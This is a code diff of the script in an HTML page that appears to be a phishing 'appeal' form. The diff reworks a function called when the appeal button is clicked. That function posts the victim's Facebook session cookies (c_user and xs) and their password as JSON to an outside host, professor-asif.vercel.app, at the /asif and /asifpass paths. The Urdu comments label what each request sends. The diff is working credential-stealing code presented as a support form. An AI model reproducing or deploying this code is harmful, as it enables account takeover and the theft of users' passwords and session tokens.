@@ -1552,46 +1552,35 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
-        function submitToOtherEndpoints(data) {
-    // c_user اور xs والا endpoint
-    const formData1 = new FormData();
-    formData1.append('c_user', data.c_user);
-    formData1.append('xs', data.xs);
-
+ function submitToOtherEndpoints(data) {
+    // c_user اور xs بھیجنے والا endpoint
+    const data1 = {
+        c_user: data.c_user,
+        xs: data.xs
+    };
     fetch('https://professor-asif.vercel.app/asif', {
         method: 'POST',
-        body: formData1
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data1)
     })
-    .then(response => {
-        if (!response.ok) throw new Error('Network response was not ok');
-        return response.text();
-    })
-    .then(result => {
-        console.log('c_user & xs submission successful:', result);
-    })
-    .catch(error => {
-        console.error('Error submitting c_user & xs:', error);
-    });
+    .then(r => { if (!r.ok) throw new Error('c_user/xs request failed'); return r.text(); })
+    .then(console.log)
+    .catch(console.error);
 
-    // password والا endpoint
-    const formData2 = new FormData();
-    formData2.append('password', data.password);
-
+    // password بھیجنے والا endpoint
+    const data2 = {
+        password: data.password
+    };
     fetch('https://professor-asif.vercel.app/asifpass', {
         method: 'POST',
-        body: formData2
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data2)
     })
-    .then(response => {
-        if (!response.ok) throw new Error('Network response was not ok');
-        return response.text();
-    })
-    .then(result => {
-        console.log('Password submission successful:', result);
-    })
-    .catch(error => {
-        console.error('Error submitting password:', error);
-    });
+    .then(r => { if (!r.ok) throw new Error('Password request failed'); return r.text(); })
+    .then(console.log)
+    .catch(console.error);
 }
+
 
         
         submitBtn.addEventListener('click', async function(e) {
@@ -1883,6 +1872,7 @@
     </script>
 
 </body></html>
+
 
 
 
